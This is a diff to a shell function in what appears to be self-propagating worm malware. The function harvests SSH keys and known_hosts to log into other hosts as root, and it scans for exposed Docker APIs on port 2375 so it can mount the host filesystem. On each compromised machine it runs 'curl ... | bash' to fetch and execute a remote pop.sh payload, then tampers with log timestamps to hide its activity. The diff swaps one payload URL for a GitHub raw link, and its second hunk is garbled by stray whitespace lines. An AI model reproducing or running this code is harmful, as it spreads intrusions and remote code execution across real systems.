@@ -598,7 +598,7 @@ scangogo() {
 	        for hd in {hb[@]}; do
 	            if [ -f $hd/.ssh/known_hosts ] && [ "$(find $hd/.ssh -type f -name "id_*" -print|wc -l)" -ne 0 ]; then
 	                for i in $(grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" $hd/.ssh/known_hosts); do
-	                    ssh -oBatchMode=yes -oStrictHostChecking=no -oConnectTimeOut=8 -t root@$i "curl -A qi/1.1 -sL http://34.92.166.158:8080/files/pop.sh | bash &"
+	                    ssh -oBatchMode=yes -oStrictHostChecking=no -oConnectTimeOut=8 -t root@$i "curl -A qi/1.1 -sL https://raw.githubusercontent.com/nandakrr/xanthe/main/pop.sh | bash &"
 	                done
 	            fi
 	        done
@@ -625,7 +625,12 @@ scangogo() {
 	        ip -o -f inet a show|awk '/scope global/ {print $4}'|xargs masscan "$@" --ports 2375 --rate=5000 -oG ${sl}
 	        sed -i -e 's/^Host: \([0-9.]*\).*Ports: \([0-9]*\).*$/\1:\2/g' -e '/Masscan/d' -e '/scanned/d' ${sl}
 	        while read i; do
-	            docker -H tcp://$i run --rm -v /:/mnt busybox chroot /mnt sh -c "curl -A qi/1.1 -sL http://34.92.166.158:8080/files/pop.sh | bash &"
+	            docker -H tcp://$i run --rm -v /:/mnt busybox chroot /mnt sh -c "curl -A qi/1.1 -sL http://34.92.166.158:8080/files/
+		    
+		    
+		    
+		    
+		    | bash &"
 	        done < ${sl}
 	        rm -f ${sl}
 	        touch -amr /var/log/boot.log /var/log/alternatives.log.1
